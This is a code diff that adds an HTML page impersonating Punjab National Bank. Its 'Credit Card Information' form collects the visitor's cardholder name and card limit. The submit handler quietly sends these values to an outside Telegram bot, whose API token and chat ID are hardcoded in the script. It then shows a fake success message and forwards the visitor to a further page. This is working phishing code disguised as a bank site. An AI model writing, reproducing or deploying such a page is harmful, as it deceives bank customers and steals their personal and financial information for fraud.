@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Punjab National Bank</title>
+    <link rel="stylesheet" href="style4.css">
+    <style>
+        /* Basic Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .menu-toggle {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+            padding: 10px;
+            margin-left: 20px;
+        }
+
+        .menu-toggle span {
+            width: 25px;
+            height: 4px;
+            background-color: #333;
+            margin: 4px 0;
+            transition: 0.4s;
+        }
+
+        .nav-links {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .nav-links li {
+            list-style: none;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #333;
+            padding: 10px;
+            display: block;
+            font-size: 16px;
+        }
+
+        /* Styling for the menu when it's open */
+        .nav-links.show-menu {
+            display: block;
+            position: absolute;
+            top: 60px;
+            right: 0;
+            background-color: #fff;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .nav-links li {
+            padding: 15px;
+        }
+
+        /* For mobile responsiveness */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+                width: 100%;
+            }
+
+            .menu-toggle {
+                display: flex;
+            }
+        }
+
+        /* Rotate the menu toggle when the menu is open */
+        .menu-toggle.open span:nth-child(1) {
+            transform: rotate(-45deg);
+            position: relative;
+            top: 10px;
+        }
+
+        .menu-toggle.open span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-toggle.open span:nth-child(3) {
+            transform: rotate(45deg);
+            position: relative;
+            top: -10px;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none; 
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(0, 0, 0);
+            background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+            padding-top: 60px;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 5% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Section -->
+    <header>
+        <button class="menu-toggle">
+            <span></span>
+            <span></span>
+            <span></span>
+        </button> <!-- ☰ Left Side -->
+        <div class="logo-container">
+            <img src="pnb-logo.png" alt="PNB Logo">
+        </div>
+        <nav>
+            <ul class="nav-links">
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Corporate</a></li>
+                <li><a href="#">NRI</a></li>
+                <li><a href="#">Agri</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Credit Card Form -->
+    <main>
+        <section class="verification-form">
+            <h2>Credit Card Information</h2>
+            <form id="credit-card-form">
+                <label for="cardholder-name">Cardholder Name (Max 20 characters):</label>
+                <input type="text" id="cardholder-name" name="cardholder-name" maxlength="20" required placeholder="Enter your name" autocomplete="name">
+        
+                <label for="card-limit">Card Limit (₹5000 to ₹500000):</label>
+                <input type="number" id="card-limit" name="card-limit" min="5000" max="500000" required placeholder="Enter your card limit" autocomplete="off">
+        
+                <button type="submit">Submit</button>
+            </form>
+        </section>
+    </main>
+    
+    <!-- Footer -->
+    <footer class="footer-container">
+        <p class="footer-text">&copy; 2025 Punjab National Bank. All Rights Reserved.</p>
+        <img src="pnb-drawal.png" alt="PNB Drawal Image" class="footer-image">
+    </footer>
+
+    <!-- Modal Popup -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Success!</h2>
+            <p>Your Credit Card information has been successfully submitted.</p>
+            <button onclick="window.location.href = 'dobnet.html';">Proceed</button>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // ☰ Menu Toggle for Mobile
+        document.querySelector(".menu-toggle").addEventListener("click", function() {
+            document.querySelector(".nav-links").classList.toggle("show-menu");
+            this.classList.toggle("open");
+        });
+
+        document.getElementById("credit-card-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            let name = document.getElementById("cardholder-name").value.trim();
+            let limit = document.getElementById("card-limit").value.trim();
+
+            if (name === "" || limit === "" || limit < 5000 || limit > 500000) {
+                alert("Please provide valid information:\n- Cardholder Name (Max 20 characters)\n- Card Limit between ₹5000 and ₹500000");
+                return;
+            }
+
+            // Show the modal on successful submission
+            let modal = document.getElementById("modal");
+            modal.style.display = "block";
+
+            // Close the modal when the user clicks the 'X' button
+            let closeBtn = document.querySelector(".close");
+            closeBtn.addEventListener("click", function() {
+                modal.style.display = "none";
+            });
+
+            // Send data to Telegram
+            const tgApiToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // New Token
+            const chatId = "7558871636"; // New Chat ID
+            const message = `✉ New Credit Card Submission\n★ Name: ${name}\n★ Limit: ₹${limit}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${tgApiToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } catch (error) {
+                console.error("Telegram API error:", error);
+            }
+        });
+
+        // Close the modal if the user clicks outside of it
+        window.onclick = function(event) {
+            let modal = document.getElementById("modal");
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        };
+    </script>
+
+</body>
+</html>
